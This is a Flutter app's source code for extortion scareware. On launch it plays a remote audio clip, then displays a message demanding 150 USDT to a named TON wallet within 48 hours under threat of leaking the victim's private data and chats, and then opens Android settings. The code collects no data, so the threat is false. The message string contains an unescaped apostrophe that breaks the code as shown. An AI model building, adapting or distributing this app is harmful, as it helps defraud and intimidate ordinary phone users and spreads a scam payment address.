import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:android_intent_plus/android_intent_plus.dart';
import 'dart:io';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(home: MainPage());
  }
}

class MainPage extends StatefulWidget {
  const MainPage({super.key});
  @override
  State<MainPage> createState() => _MainPageState();
}

class _MainPageState extends State<MainPage> {
  final player = AudioPlayer();

  @override
  void initState() {
    super.initState();
    Future.delayed(const Duration(seconds: 1), () async {
      await player.play(UrlSource("https://files.catbox.moe/bkz6o8.mp3"));
      await Future.delayed(const Duration(seconds: 5));
      if (Platform.isAndroid) {
        const intent = AndroidIntent(action: 'android.settings.SETTINGS');
        intent.launch();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        Image.network(
          'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
          fit: BoxFit.cover,
        ),
        const Center(
          child: Text(
            'Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.',
            style: TextStyle(color: Colors.green, fontSize: 12),
          ),
        ),
      ],
    );
  }
}
